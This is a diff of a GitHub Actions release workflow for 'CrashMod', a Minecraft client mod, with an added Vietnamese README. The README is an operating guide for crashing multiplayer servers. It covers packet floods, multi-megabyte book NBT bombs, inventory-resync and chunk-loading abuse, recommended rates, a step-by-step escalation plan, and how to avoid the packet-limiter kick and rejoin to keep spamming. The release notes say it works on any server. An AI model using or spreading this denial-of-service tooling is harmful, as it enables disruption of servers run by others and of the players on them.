+          - Khong mo duoc khi dang o inventory / chat / sach -> bam `Esc` truoc.
+          - Doi phim: Options > Controls > CrashMod.
+          - Dong GUI: `Esc` hoac nut **Dong**.
+
+          ## GUI co gi
+          - Dong 1: phim, so mode dang bat, rate (pkt/tick). pkt/s = rate x 20.
+          - Dong 2: canh bao sach tren tay (do = chua cam sach va but).
+          - Dong 3: bang mau theo nhom.
+          - Dong 4: ghi chu cua mode vua bam.
+          - 36 nut mode, 4 cot. `[x]` = dang bat.
+          - Nut: `-` `+` `KILL` `BAT HET` `TAT HET` `Dong`
+
+          ## Mau = nhom
+          | Mau | Nhom | Nghia |
+          |---|---|---|
+          | xam | FLOOD | re tien, spam so luong lon -> de bi packet-limiter kick |
+          | vang | BOMB | dat tien, moi packet work khong lo |
+          | xanh | GUI/INV | ep server resync inventory |
+          | tim | CHUNK | di chuyen / status / interact |
+          | do | COMBO | preset to hop |
+
+          ## 3 quy tac dung dung
+          1. Bat **MOT** mode truoc, xem ket qua, roi moi chong them. Bat het ngay tu dau thi khong biet cai nao giet duoc no.
+          2. **Rate la packet moi tick.** pkt/s = rate x 20.
+          3. **Mode can dung item / dieu kien:**
+             - `Book*` + `Book+Click` -> phai cam **sach va but**
+             - `Drop` -> phai co item tren tay (het stack la dung)
+             - `Sign bomb` -> phai dung ngay tren **sign that**
+             - `Right block` / `Pick block` -> phai dung tren **khoi ran** (block duoi chan)
+             - `Respawn` -> chi an khi ban **dang chet**
+             - `Right item` -> phai cam item dung duoc (do an, thuoc, cung)
+
+          ## Rate goi y
+          | Mode | Rate |
+          |---|---|
+          | Swing / Look / Move / Abilities / Input / Sprint | 500 - 10000 |
+          | Chat / Cmd sai / Tab / Tab dai / Tab nhieu | 100 - 2000 |
+          | Payload / Payload32K | 1000 - 10000 |
+          | Click inv / Resync inv / Dong GUI / Swap hand | 100 - 2000 |
+          | Book 25KB | 5 - 20 |
+          | Book 100KB | 2 - 10 |
+          | Book 3MB / Book+title | 1 - 5 |
+          | Book+Click | 50 - 200 |
+          | Chunk hop | 5 - 50 |
+          | Stats / Right block / Pick block | 100 - 2000 |
+          | NUKE / NUKE 2 | 10 - 100 |
+
+          ## Test nhanh mod co an khong
+          | Bat | Phai thay |
+          |---|---|
+          | `Swing` rate 20 | tay vung lien tuc |
+          | `Look` rate 20 | camera quay loan |
+          | `Chat` rate 5 | chat spam "CrashMod 1, 2, 3..." |
+          | `Cmd sai` rate 5 | server tra `Unknown command: crashmod1` |
+          | `Book 100KB` rate 2 | mo sach thay day chu A |
+          | `Stats` | bang thong ke lon gui ve lien tuc |
+          | `Payload` | khong thay gi tren client, chi thay trong log server |
+
+          ## Kich ban 5 phut dau
+          1. Vao cho **dat trong, phang**.
+          2. `Swing` rate 100 -> xem server chiu duoc gi.
+          3. `TAT HET`. Cam sach va but. `Book 3MB` rate 2, dung yen 5 giay.
+          4. Tat `Book 3MB`. Bat `Click inv` rate 200 -> don OOM.
+          5. Server van song: `BAT HET` + rate 50000 (chi voi server khong limiter).
+
+          ## Chong bi kick (KHONG phai sap server)
+          Paper / Purpur mac dinh co packet-limiter: **500 packet / 7 giay** = ~71 pkt/s
+          -> **rate <= 3** moi khong bi kick `Sent too many packets`.
+          Vanilla / Spigot khong co limiter -> tha ho rate 1000 - 100000.
+
+          ## Luu y
+          - Config luu o `.minecraft/config/crashmod.properties`. Mode dang bat **van con** sau khi restart game -> vao server moi la flood ngay tu tick dau. Muon sach thi `TAT HET` truoc khi thoat.
+          - Bat mode o **menu chinh khong gui packet nao** (chua co player/connection).
+          - Rate 100000 x nhieu mode -> **client ban co the sap truoc server**. Cap client >= 4GB RAM hoac ha rate.
+          - `Chunk hop` KHONG lam man hinh ban bay - server moi la ben bay. Tat mode co the bi keo ve / roi / ngop block.
+          - Bi kick khac voi server sap. Kick thi vao lai spam tiep.
           EOF
           fi
 
@@ -706,6 +1043,7 @@ jobs:
             gradle/
             src/
             LICENSE
+            README.md
             .gitignore
             run/
 
@@ -720,7 +1058,7 @@ jobs:
       fail-fast: false
       matrix:
         include:
-          - { mc: '1.21.11', yarn: '1.21.11+build.3', fabric: '0.141.6+1.21.11' }
+          - { mc: '1.21.11', yarn: '1.21.11+build.4', fabric: '0.141.6+1.21.11' }
     steps:
       - uses: actions/checkout@v4
 
@@ -736,6 +1074,17 @@ jobs:
       - uses: actions/download-artifact@v4
         with:
           name: source
+
+      # cache nay duoc job smoke-test dung lai -> boot server nhanh hon nhieu
+      - name: Cache Minecraft dev env (loom)
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches/fabric-loom
+            ~/.gradle/caches/modules-2
+          key: loom-${{ runner.os }}-${{ matrix.mc }}-${{ hashFiles('gradle.properties') }}
+          restore-keys: |
+            loom-${{ runner.os }}-${{ matrix.mc }}-
 
       - name: Build
         run: |
@@ -758,6 +1107,7 @@ jobs:
                   "vn/venice/crashmod/Config.class",
                   "vn/venice/crashmod/CrashRegistry.class",
                   "vn/venice/crashmod/net/FloodPayload.class",
+                  "vn/venice/crashmod/net/BigPayload.class",
                   "vn/venice/crashmod/client/CrashModClient.class",
                   "vn/venice/crashmod/client/Packets.class",
                   "vn/venice/crashmod/client/ToggleScreen.class"]
@@ -779,14 +1129,19 @@ jobs:
             !build/libs/*-sources.jar
 
   # ==========================================================================
-  # JOB 3 - SMOKE TEST
+  # JOB 3 - SMOKE TEST (co the bo qua)
   # ==========================================================================
   smoke-test:
     name: Smoke test
-    needs: build
+    needs: [ decide, build ]
+    if: needs.decide.outputs.smoke == 'co'
     runs-on: ubuntu-latest
-    timeout-minutes: 25
+    timeout-minutes: 15
     steps:
+      - name: Thong bao
+        run: |
+          echo "::notice title=Smoke test::Dang chay vi smoke=co. Neu khong can, lan sau chon 'khong'."
+
       - uses: actions/checkout@v4
 
       - uses: actions/setup-java@v4
@@ -802,6 +1157,17 @@ jobs:
         with:
           name: source
 
+      # restore tu cache job build -> khong phai remap Minecraft lai
+      - name: Cache Minecraft dev env (loom)
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches/fabric-loom
+            ~/.gradle/caches/modules-2
+          key: loom-${{ runner.os }}-1.21.11-${{ hashFiles('gradle.properties') }}
+          restore-keys: |
+            loom-${{ runner.os }}-1.21.11-
+
       - name: Chay dedicated server headless
         run: |
           set -uo pipefail
@@ -810,22 +1176,25 @@ jobs:
           printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties
           rm -rf run/logs || true
 
+          START=$(date +%s)
           gradle runServer --no-daemon --console=plain > stdout.log 2>&1 &
           GPID=$!
 
           OK=0
-          for i in $(seq 1 150); do
+          for i in $(seq 1 120); do
             grep -qs "CrashMod\] da nap" run/logs/latest.log && { OK=1; break; }
-            sleep 4
+            sleep 2
           done
+          END=$(date +%s)
 
+          echo ">> boot mat $((END-START))s"
           tail -n 30 run/logs/latest.log 2>/dev/null || tail -n 30 stdout.log || true
           pkill -f devlaunchinjector || true
           kill "$GPID" 2>/dev/null || true
           sleep 2
 
-          [ "$OK" = "1" ] || { echo "!! SMOKE TEST FAIL"; exit 1; }
-          echo ">> SMOKE TEST PASS"
+          [ "$OK" = "1" ] || { echo "::error title=Smoke test::FAIL - server khong boot duoc"; exit 1; }
+          echo "::notice title=Smoke test::PASS sau $((END-START))s"
 
       - uses: actions/upload-artifact@v4
         if: failure()
@@ -841,13 +1210,12 @@ jobs:
   # ==========================================================================
   release:
     name: Release
-    needs: [ build, smoke-test ]
+    needs: [ decide, build, smoke-test ]
     if: >-
       always() && !cancelled()
-      && github.event_name != 'pull_request'
+      && needs.decide.outputs.release == 'co'
       && needs.build.result == 'success'
-      && needs.smoke-test.result == 'success'
-      && (startsWith(github.ref, 'refs/tags/v') || github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master' || github.event_name == 'workflow_dispatch')
+      && (needs.smoke-test.result == 'success' || needs.smoke-test.result == 'skipped')
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -871,6 +1239,11 @@ jobs:
 
       - uses: actions/download-artifact@v4
         with:
+          name: source
+          path: src-artifact
+
+      - uses: actions/download-artifact@v4
+        with:
           pattern: 'crashmod-jar'
           path: dist
           merge-multiple: true
@@ -883,43 +1256,20 @@ jobs:
           sha256sum *.jar > checksums.txt
           cat checksums.txt
 
-      - name: Notes
+      - name: Notes (lay README + them phan build)
         run: |
-          cat > dist/NOTES.md <<'EOF'
-          ## CrashMod v2
+          set -euo pipefail
+          mkdir -p dist
+          cp src-artifact/README.md dist/NOTES.md
+          cat >> dist/NOTES.md <<'EOF'
 
-          Client-only. Khong can cai len server. Chi Fabric Loader + Fabric API o client.
+          ---
 
-          ### Dung
-          1. Bo jar vao `.minecraft/mods/`.
-          2. Vao bat ky server nao.
-          3. Bam **Shift + M** -> bat/tat cac mode.
-
-          ### Book NBT bomb - vu khi chinh
-          Cam **sach va but** tren tay, bat `Book 100KB` hoac `Book 3MB`.
-          Moi packet = 1 cuon sach 100KB-3MB. Server phai deserialize NBT,
-          luu vao item, roi gui tra lai trong goi sync inventory. 1 vao ~ 1 ra.
-          Khong phu thuoc packet-limiter.
-
-          `Book+Click`: sach 100KB + click revision sai -> server vua nuot sach
-          vua phai syncState() tra full inventory.
-
-          ### Chunk hop
-          Dich chuyen 8 block moi packet. Server phai load/generate chunk doc duong.
-
-          ### Preset KILL
-          Bat: book_click + click + chunk_hop + drop + tab_long, rate 100.
-
-          ### Rate goi y
-          - Flood (swing/look/move): 1000-10000
-          - Book don le: 1-5
-          - Book+Click: 50-200
-          - Chunk hop: 10-100
-
-          ### Luu y
-          Paper/Spigot mac dinh co packet-limiter 500 packet / 7 giay -> bi KICK.
-          Vanilla server hoac server tat limiter -> flood moi crash duoc.
+          ## Ban build nay
           EOF
+          printf -- "- MC 1.21.11 | commit \`%s\` | smoke test: %s\n" \
+            "$(echo "${GITHUB_SHA}" | cut -c1-7)" "${{ needs.decide.outputs.smoke }}" >> dist/NOTES.md
+          printf -- "- File: xem \`checksums.txt\`\n" >> dist/NOTES.md
 
       - uses: softprops/action-gh-release@v2
         with:
